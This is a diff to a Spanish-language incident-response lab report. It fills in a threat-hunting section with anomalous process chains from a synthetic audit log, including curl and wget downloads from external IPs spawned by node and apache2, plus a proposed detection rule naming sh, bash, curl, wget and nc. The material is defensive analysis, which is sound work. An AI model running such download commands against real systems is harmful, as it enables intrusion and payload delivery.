@@ -126,21 +126,25 @@ La reversión se mantuvo únicamente como procedimiento documentado para una eve
 
 ## 4. Detección y caza
 
-**Hipótesis:** _una frase: proceso, padre, horario, evidencia esperada._
+El detalle completo está en [`deteccion.md`](deteccion.md) y la salida de los filtros en `capturas/16-deteccion-procesos.txt`.
+
+**Hipótesis:** si algún servicio fue explotado, el proceso del servicio (`apache2`, `node` o `python`) debería aparecer lanzando una shell o una herramienta de descarga entre las 09:40 y las 09:49 UTC del 27/10, primero con comandos de reconocimiento y después con alguna descarga desde una IP externa.
 
 **Hallazgos en `audit.log`:**
 
 | Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
 |-------------------|------|--------------|:---------:|---------|
-| | | | | |
-| | | | | |
+| L6-L7 · 09:42:17 | web01 | apache2 → `sh -c id` → `id` | Sí | El servidor web ejecuta un comando de reconocimiento. |
+| L9-L10 · 09:43:03 | api01 | node → `sh` → `curl http://198.51.100.7/x` | Sí | La API lanza una descarga desde una IP externa. |
+| L14 · 09:44:22 | web01 | apache2 → `wget http://198.51.100.9/a` | Sí | Otra descarga desde el servidor web, desde el mismo rango de IPs. |
+| L16-L17 · 09:45:10 | svc01 | python → `sh` → `uname -a` | Sí | Reconocimiento del sistema en el servicio interno. |
+| L8, L13, L21 | db01 | sshd → `bash` | Indeterminado | Pueden ser sesiones de un administrador; el log no trae usuario ni IP. |
 
-**¿Hay compromiso?** _sí/no/indeterminado, con evidencia._
+**¿Hay compromiso?** Sí en web01 y api01, porque el proceso del servicio ejecutó comandos y lanzó descargas. En svc01 también hay ejecución de comandos, pero no sabemos cómo llegaron porque es un servicio interno. db01 queda indeterminado. El log no permite saber si las descargas funcionaron ni si hubo escalada a root.
 
-**Regla propuesta para Node.js:** _qué proceso observa, qué condición y qué falso
-negativo podría tener._
+**Regla propuesta para Node.js:** alertar cuando un proceso `node` lanza `sh`, `bash`, `curl`, `wget`, `nc` u otro intérprete, y seguir también a los procesos que lance ese hijo, porque el filtro de `detectar.sh` no muestra las líneas 7, 10 y 17. El principal falso negativo es un atacante que descarga algo con `fetch()` dentro del mismo proceso `node`, sin crear ningún proceso hijo.
 
-**Limitaciones del log:** _usuario, IP de origen, retención, ruido, etc._
+**Limitaciones del log:** no tiene usuario, IP de origen ni el request HTTP, no muestra si los comandos funcionaron, no registra red ni archivos, cubre solo 9 minutos y es un registro sintético de laboratorio.
 
 ---
 
